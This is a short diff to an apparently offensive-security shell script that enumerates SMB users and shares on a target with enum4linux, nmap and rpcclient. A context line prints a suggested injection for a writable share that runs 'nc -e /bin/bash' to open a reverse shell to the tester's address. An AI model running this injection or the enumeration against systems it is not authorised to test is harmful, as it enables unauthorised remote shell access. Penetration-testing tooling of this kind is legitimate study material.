@@ -36,7 +36,10 @@ if [ "$#" = "1" ]; then
 			enum4linux -a $1 | grep -P 'User\\' 
 			printf "\n\n{Y}[+][+] Enumerating SMB users with Nmap ${NC}\n\n"
 			nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139,445 $1
+			printf "\n\n{Y}[+][+] Enumerating SMB shares with Nmap ${NC}\n\n"
+			nmap --script smb-enum-shares -p 139,445 $1
 			printf "\n\n${Y}[+][+] Try the following on a writable share: logon \"./='nohup nc -e /bin/bash <Your-IP-Address-here> 9001'\" ${NC}\n\n"
+			printf "\n\n${Y}[+][+] rpcclient -U \"\" -N [ip] ${NC}\n\n"
 			count=$((count+1))
 			fi
         fi
